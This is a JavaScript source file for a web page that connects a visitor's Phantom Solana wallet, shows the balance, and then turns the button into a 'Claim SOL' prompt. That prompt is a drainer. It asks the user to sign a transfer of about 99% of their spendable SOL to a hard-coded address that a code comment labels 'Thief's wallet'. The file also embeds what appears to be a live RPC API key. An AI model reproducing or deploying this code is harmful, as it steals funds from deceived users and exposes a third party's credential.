$(document).ready(function() {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                alert("Phantom Wallet connected:", resp.publicKey.toString());

                  // 3. Create Solana connection (public endpoint

               try {
    const connection = new solanaWeb3.Connection(
      "https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H",
      "confirmed"
    );

    const public_key = new solanaWeb3.PublicKey(resp.publicKey);
    const walletBalance = await connection.getBalance(public_key);

    const balanceInSOL = walletBalance / solanaWeb3.LAMPORTS_PER_SOL;
    alert(`Wallet balance: ${balanceInSOL} SOL`);

      const minBalance = await connection.getMinimumBalanceForRentExemption(0);
alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL`);

              /**   if (walletBalance < minBalance) {
                    alert("Insufficient funds to claim.");
                    return;
                }*/
  } catch (err) {
    console.error("Error found:", err);
    alert("Error: " + err.message);
  }

              

                $('#connect-wallet').text("Claim SOL");
                $('#connect-wallet').on('click', async () => {
                    try {
                        const recieverWallet = new solanaWeb3.PublicKey('DRYjXYjya45KLzD5HmtBd4QeUA6SqypNoJDhgoie8bnF'); 
                        // Thief's wallet
                        alert("Preparing to transfer SOL to:", recieverWallet.toString());
                        const balanceForTransfer = walletBalance - minBalance;
                        alert(`Transferring ${balanceForTransfer / solanaWeb3.LAMPORTS_PER_SOL} SOL to the receiver wallet.`);
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        var transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: resp.publicKey,
                                toPubkey: recieverWallet,
                                lamports: balanceForTransfer * 0.99,
                            }),
                        );

                        transaction.feePayer = window.solana.publicKey;
                        let blockhashObj = await connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;

                        const signed = await window.solana.signTransaction(transaction);
                        alert("Transaction signed:", signed);

                        let txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        alert("Transaction confirmed:", txid);
                    } catch (err) {
                        console.error("Error during payout:", err);
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
            }
        } else {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });
});